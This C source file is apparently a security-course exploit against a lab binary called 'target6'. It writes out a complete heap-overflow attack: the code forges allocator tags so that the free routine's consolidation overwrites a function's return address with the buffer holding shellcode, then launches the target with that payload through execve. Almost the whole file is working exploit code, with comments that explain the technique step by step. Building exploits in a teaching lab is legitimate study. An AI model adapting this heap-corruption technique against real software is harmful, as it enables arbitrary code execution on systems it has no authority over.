#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

int main(void)
{
  	char *args[3];
  	char *env[1];
	char filler[192];
	int i;

	//first 4 bytes is the first tag previous and is never used so can be garbage
	for (i = 0; i < 4; i++){
		filler[i] = '\x90';
	}
	
	// this is the first tag's next which needs to be set as free and so any address would work
	// as long as its odd, so that tfree can consolidate left and overwrite the return address
	filler[4] = '\x01';
	filler[5] = '\xff';
	filler[6] = '\xff';
	filler[7] = '\xff';

	// add the shellcode after this (what came before is not illegal so when we come back to this
	//it will be skipped over and shellcode will be run)
	int shell_len = strlen(shellcode);

	memcpy(filler+8, shellcode, shell_len);
	

	// pad with NOPs until we reach where fake tag at q is supposed to be
	for (i = 53; i < 72; i++){
		filler[i] = '\x90';
	}

	//set fake tag of q prev to point at buf which will have all prior information added above in it
	filler[72] = '\x28';
	filler[73] = '\xee';
	filler[74] = '\x04';
	filler[75] = '\x01';

	// set fake tag next to be the return address of foo, this will be used to overwrite the return address with
	//the address of buf (p the second allocation). this all occurs in tfree which effectively will point at the return
	//address in memory, treat it like a tag and set it's "prev" to be q prev which is the address of buf, this is done by 
	//tfree where it takes q's next's prev and sets it to be q prev
	filler[76] = '\x68';
	filler[77] = '\xfe';
	filler[78] = '\x42';
	filler[79] = '\x40';

 	args[0] = TARGET;
	args[1] = filler; 
	args[2] = NULL;
	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
